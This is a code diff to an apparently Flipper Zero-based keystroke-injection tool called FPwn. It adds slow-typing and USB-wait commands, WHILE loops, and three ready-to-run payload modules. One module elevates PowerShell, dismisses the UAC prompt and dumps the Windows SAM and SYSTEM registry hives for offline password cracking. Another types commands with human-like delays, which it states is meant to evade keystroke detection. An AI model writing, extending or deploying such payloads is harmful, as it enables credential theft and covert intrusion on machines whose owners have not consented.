@@ -620,6 +620,41 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- STRINGLN_DELAY <ms> <text> — type with per-char delay then ENTER ---- */
+    if(strncmp(line, "STRINGLN_DELAY ", 15) == 0) {
+        const char* rest = line + 15;
+        char delay_buf[8];
+        const char* space = strchr(rest, ' ');
+        if(space) {
+            size_t dlen = (size_t)(space - rest);
+            if(dlen > sizeof(delay_buf) - 1) dlen = sizeof(delay_buf) - 1;
+            memcpy(delay_buf, rest, dlen);
+            delay_buf[dlen] = '\0';
+            uint32_t char_delay = (uint32_t)atoi(delay_buf);
+            const char* text = space + 1;
+            char expanded[FPWN_MAX_LINE_LEN];
+            fpwn_var_substitute(text, expanded, sizeof(expanded));
+            for(const char* ch = expanded; *ch; ch++) {
+                fpwn_type_char(*ch);
+                if(char_delay > 0) furi_delay_ms(char_delay);
+            }
+        }
+        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+        return;
+    }
+
+    /* ---- WAIT_FOR_USB — wait until USB HID is connected (30s timeout) ---- */
+    if(strcmp(line, "WAIT_FOR_USB") == 0) {
+        uint32_t start = furi_get_tick();
+        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(30000)) {
+            if(furi_hal_hid_is_connected()) break;
+            furi_delay_ms(100);
+        }
+        return;
+    }
+
     /* ---- Single named keys ---- */
     if(strcmp(line, "ENTER") == 0 || strcmp(line, "RETURN") == 0) {
         furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
@@ -2314,6 +2349,113 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
             continue;
         }
 
+        /* Handle WHILE $VAR == value / END_WHILE — condition-tested loops.
+         * Records file position before the body, executes body commands,
+         * re-evaluates condition at END_WHILE and seeks back if true.
+         * Safety cap: max 1000 iterations to prevent infinite loops. */
+        if(strncmp(substituted, "WHILE ", 6) == 0) {
+            uint32_t while_start = (uint32_t)storage_file_tell(file);
+            int while_iters = 0;
+            const int while_max = 1000;
+            bool while_active = true;
+
+            while(while_active && !app->abort_requested && while_iters < while_max) {
+                /* Evaluate condition: WHILE $VAR == value  or  WHILE $VAR != value */
+                const char* wexpr = substituted + 6;
+                bool wcond = false;
+                if(wexpr[0] == '$') {
+                    const char* ws = wexpr + 1;
+                    const char* we = ws;
+                    while((*we >= 'A' && *we <= 'Z') || (*we >= 'a' && *we <= 'z') ||
+                          (*we >= '0' && *we <= '9') || *we == '_')
+                        we++;
+                    char wn[FPWN_VAR_NAME_LEN];
+                    size_t wnl = (size_t)(we - ws);
+                    if(wnl > FPWN_VAR_NAME_LEN - 1) wnl = FPWN_VAR_NAME_LEN - 1;
+                    memcpy(wn, ws, wnl);
+                    wn[wnl] = '\0';
+                    const char* wop = we;
+                    while(*wop == ' ')
+                        wop++;
+                    bool weq = (strncmp(wop, "==", 2) == 0);
+                    bool wneq = (strncmp(wop, "!=", 2) == 0);
+                    if(weq || wneq) {
+                        const char* wvs = wop + 2;
+                        while(*wvs == ' ')
+                            wvs++;
+                        const char* wact = fpwn_var_get(wn);
+                        if(!wact) wact = "";
+                        bool wm = (strcmp(wact, wvs) == 0);
+                        wcond = weq ? wm : !wm;
+                    }
+                }
+
+                if(!wcond) {
+                    /* Condition false — skip to END_WHILE */
+                    int wdepth = 1;
+                    while(wdepth > 0 && !storage_file_eof(file) && !app->abort_requested) {
+                        size_t sn = fpwn_read_line(file, raw, sizeof(raw));
+                        if(sn == 0) break;
+                        char* st = fpwn_trim(raw);
+                        if(strncmp(st, "WHILE ", 6) == 0)
+                            wdepth++;
+                        else if(strcmp(st, "END_WHILE") == 0)
+                            wdepth--;
+                        if(st[0] != '\0' && st[0] != '#') lines_done++;
+                    }
+                    while_active = false;
+                    break;
+                }
+
+                /* Execute body until END_WHILE */
+                bool found_end_while = false;
+                while(!storage_file_eof(file) && !app->abort_requested) {
+                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
+                    if(sn == 0) break;
+                    char* wt = fpwn_trim(raw);
+                    if(wt[0] == '\0' || wt[0] == '#') continue;
+                    char wsub[FPWN_MAX_LINE_LEN];
+                    fpwn_substitute(wt, wsub, sizeof(wsub), module);
+                    if(strcmp(wsub, "END_WHILE") == 0) {
+                        found_end_while = true;
+                        break;
+                    }
+                    with_view_model(
+                        app->execute_view,
+                        FPwnExecModel * em,
+                        {
+                            size_t cl = strlen(wsub);
+                            if(cl > sizeof(em->status) - 1) cl = sizeof(em->status) - 1;
+                            memcpy(em->status, wsub, cl);
+                            em->status[cl] = '\0';
+                        },
+                        true);
+                    fpwn_exec_command(wsub, app);
+                    if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
+                    lines_done++;
+                    with_view_model(
+                        app->execute_view,
+                        FPwnExecModel * em,
+                        { em->lines_done = lines_done; },
+                        true);
+                }
+
+                if(!found_end_while) {
+                    while_active = false; /* Missing END_WHILE — stop */
+                } else {
+                    /* Seek back to re-evaluate the condition */
+                    storage_file_seek(file, while_start, true);
+                    while_iters++;
+                }
+            }
+            continue;
+        }
+        if(strcmp(substituted, "END_WHILE") == 0) {
+            /* Standalone END_WHILE without matching WHILE — skip */
+            lines_done++;
+            continue;
+        }
+
         /* Update status to show the command being executed */
         with_view_model(
             app->execute_view,
@@ -3480,6 +3622,90 @@ static const char SAMPLE_INJECT_CHAIN[] =
     "LED_COLOR GREEN\n"
     "INJECT lock_screen.fpwn\n";
 
+/* SAM Dump — extracts SAM hashes via reg save (Win admin only) */
+static const char SAMPLE_SAM_DUMP[] =
+    "NAME SAM Hash Dump\n"
+    "DESCRIPTION Exports SAM and SYSTEM registry hives for offline cracking\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN\n"
+    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR RED\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell\n"
+    "HOLD CTRL\n"
+    "HOLD SHIFT\n"
+    "ENTER\n"
+    "RELEASE SHIFT\n"
+    "RELEASE CTRL\n"
+    "DELAY 2000\n"
+    "ALT y\n"
+    "DELAY 1500\n"
+    "STRINGLN reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv /y\n"
+    "DELAY 1000\n"
+    "STRINGLN reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hiv /y\n"
+    "DELAY 1000\n"
+    "LED_COLOR GREEN\n"
+    "STRINGLN echo SAM+SYSTEM saved to C:\\Windows\\Temp\\\n"
+    "STRING exit\n"
+    "ENTER\n";
+
+/* Slow Typed Payload — types commands slowly to evade keystroke detection */
+static const char SAMPLE_SLOW_PAYLOAD[] =
+    "NAME Stealth Typer\n"
+    "DESCRIPTION Types commands with human-like delays to evade detection\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION COMMAND whoami \"Command to type slowly\"\n"
+    "OPTION CHAR_DELAY 50 \"Delay between keystrokes (ms)\"\n"
+    "OPTION DELAY 2000 \"Initial HID delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR YELLOW\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRINGLN_DELAY {{CHAR_DELAY}} cmd\n"
+    "DELAY 1200\n"
+    "STRINGLN_DELAY {{CHAR_DELAY}} {{COMMAND}}\n"
+    "DELAY 1000\n"
+    "LED_COLOR GREEN\n"
+    "STRINGLN_DELAY {{CHAR_DELAY}} exit\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR YELLOW\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING_DELAY {{CHAR_DELAY}} Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRINGLN_DELAY {{CHAR_DELAY}} {{COMMAND}}\n"
+    "LED_COLOR GREEN\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "LED_COLOR YELLOW\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRINGLN_DELAY {{CHAR_DELAY}} {{COMMAND}}\n"
+    "LED_COLOR GREEN\n";
+
+/* USB Wait Deploy — waits for USB connection before executing */
+static const char SAMPLE_USB_WAIT[] =
+    "NAME USB Wait Deploy\n"
+    "DESCRIPTION Waits for USB connection then runs a command (dead drop style)\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION COMMAND whoami \"Command to run after connection\"\n"
+    "PLATFORM ALL\n"
+    "LED_COLOR RED\n"
+    "REM Wait for target to plug in USB\n"
+    "WAIT_FOR_USB\n"
+    "DELAY 2000\n"
+    "LED_COLOR GREEN\n"
+    "STRING {{COMMAND}}\n"
+    "ENTER\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -3580,4 +3806,13 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/inject_chain.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_INJECT_CHAIN);
+
+    snprintf(path, sizeof(path), "%s/sam_dump.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_SAM_DUMP);
+
+    snprintf(path, sizeof(path), "%s/slow_payload.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_SLOW_PAYLOAD);
+
+    snprintf(path, sizeof(path), "%s/usb_wait.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_USB_WAIT);
 }
